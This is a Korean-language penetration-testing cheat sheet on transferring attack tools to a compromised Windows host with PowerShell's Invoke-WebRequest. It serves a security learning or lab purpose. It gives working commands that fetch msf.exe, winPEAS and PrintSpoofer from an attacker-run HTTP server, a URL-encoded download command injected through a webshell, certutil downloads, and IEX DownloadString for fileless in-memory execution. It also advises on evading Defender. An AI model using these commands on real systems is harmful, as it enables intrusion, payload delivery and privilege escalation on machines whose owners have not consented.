# Invoke-WebRequest로 파일 전송

- Invoke-WebRequest(iwr) — PowerShell 내장 HTTP 클라이언트. 공격자 http.server에서 타깃 Windows로 도구·페이로드를 내려받는 표준 전송 수단.
- 타깃 Windows 셸(웹셸·cmd·PowerShell)을 확보했고 실행 파일·스크립트를 올려야 할 때. SMB·FTP가 막혀도 아웃바운드 HTTP(80·8080)가 열려 있으면 통한다.
- 타깃에서 공격자 IP로 HTTP 접근이 가능해야 하고, 공격자 쪽에 python http.server가 먼저 떠 있어야 한다. TLS 인증서 오류는 `-UseBasicParsing`과 브라우저 대응 절차로 처리한다.

## 1. 공격자 — HTTP 서버 띄우기

```bash
# 전송할 파일이 있는 디렉터리에서
python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
```

- 80 포트가 막혀 있으면 8080·8000을 쓴다. 포트는 방화벽 정책에 따라 골라 시험한다.
- 파일 경로는 http.server 실행 디렉터리가 웹루트가 된다: `msf.exe`가 있으면 `http://공격자IP/msf.exe`

## 2. 타깃 — PowerShell로 내려받기

```powershell
Invoke-WebRequest -Uri http://192.168.45.227:80/msf.exe -OutFile C:\Temp\msf.exe
```

```powershell
# 별칭 iwr로 동일
iwr -uri http://192.168.45.227/winPEASany.exe -Outfile winPEASany.exe
```

- `-OutFile` 경로가 쓰기 가능한 디렉터리인지 확인한다. C:\Temp, %TEMP%, C:\Windows\Tasks 등이 흔히 열려 있다.
- cmd.exe에서 PowerShell을 한 줄로 호출하는 형태:

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
```

- 웹셸 파라미터로 넣을 때 URL 인코딩이 필요한 경우:

```text
http://192.168.58.189:8080/shell.php?cmd=powershell%20-c%20%22Invoke-WebRequest%20-Uri%20%27http%3A%2F%2F192.168.49.58%2FPrintSpoofer.exe%27%20-OutFile%20%27C%3A%5CTemp%2FPrintSpoofer.exe%27%22
```

## 3. 실행

```powershell
# 다운로드 확인
dir C:\Temp
# 실행
C:\Temp\msf.exe
```

- Defender가 바로 잡으면 실행 파일 변형·인코딩(경로 변경, msfvenom 인코딩, PowerShell 메모리 로드)이 필요하다.

## 대체 수단 — iwr이 막혔을 때

```powershell
# certutil (cmd 기본)
certutil -urlcache -split -f http://192.168.45.227/msf.exe C:\Temp\msf.exe
# Invoke-Expression으로 메모리 실행 (디스크에 파일을 안 남김)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.227/script.ps1')
```

- Windows 5.1 PowerShell의 Invoke-WebRequest는 IE 초기 설정(First-Run)이 안 된 환경에서 에러가 난다. 이때 `-UseBasicParsing`을 붙이거나 WebClient.DownloadFile로 전환한다.

## 트러블슈팅

- `Unable to connect to the remote server`면 방화벽·포트 문제다. 공격자 쪽에서 `nc -lvnp` 또는 http.server 로그에 요청이 찍히는지 확인한다.
- `The response content cannot be parsed`는 IE 초기화 에러다. `-UseBasicParsing`을 붙인다.
- TLS 오류(자체 서명 인증서)는 `[Net.ServicePointManager]::SecurityProtocol` 설정과 브라우저 검증 생략 대신 http(80)로 전송하는 편이 간단하다.
- 404가 나오면 경로·파일명이 틀린 것이다. 공격자 http.server 콘솔의 요청 로그로 실제 경로를 확인한다.
- 파일이 0바이트면 권한 문제로 -OutFile 쓰기가 실패한 경우다. %TEMP% 등 다른 디렉터리를 쓴다.
- 관련 문서: windows/powershell/powershell_file_transfer.md, windows/certutil.md
